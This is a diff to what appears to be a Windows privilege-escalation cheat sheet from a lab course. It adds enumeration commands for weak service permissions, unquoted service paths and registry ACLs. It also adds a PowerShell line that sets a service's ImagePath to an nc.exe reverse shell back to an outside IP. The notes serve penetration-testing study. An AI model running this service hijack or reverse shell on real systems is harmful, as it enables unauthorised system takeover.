@@ -790,7 +790,11 @@ PS C:\htb> cmd /c echo %PATH%
 
 PS C:\htb> .\SharpUp.exe audit
 
--Checking Permissions with icacls
+--Permissice access to services
+
+PS C:\tools> accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+
+-Checking ACL's  in file system with icacls
 
 PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 
@@ -815,6 +819,32 @@ PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location
 PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
 
 ```
+
+###  Unquoted Service Paths
+
+```
+PS C:\> wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+PS C:\> wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+### Permissive Registry ACLs
+
+```
+C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
+
+--Changing ImagePath with PowerShell
+
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\{ServiceName} -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+
+```
+
+### Modifiable Registry Autorun Binary
+
+```
+PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+
+```
+
 ### SeImpersonate and SeAssignPrimaryToken
 ```
 $ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
